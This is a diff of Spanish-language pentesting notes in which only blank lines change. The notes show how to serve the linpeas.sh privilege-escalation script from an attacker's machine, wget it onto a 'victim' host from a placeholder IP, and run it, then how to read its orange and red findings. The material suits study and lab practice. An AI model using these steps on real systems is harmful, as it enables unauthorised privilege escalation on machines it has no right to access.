@@ -15,6 +15,7 @@ Maquina local(host):
     
     python3 -m http.server 9001
 
+
 Maquina remota(victim)>
 
     wget http://[IP_MAQUINA_LOCAL]:9001/linpeas.sh
@@ -22,7 +23,8 @@ Maquina remota(victim)>
     chmod +x linpeas.sh
     
     ./linpeas.sh
-   
+ 
+ 
 Una vez analicemos su output, deberemos fijarnos principalmente en el contenido que tenga el fondo naranja, aunque llamara la atencion
 segun vaya generando el output. En caso de no reportar nada en naranja, deberemos mirar el color rojo, ya que puede existir un
 metodo de ecalada de privilegios en alguno de estos casos.
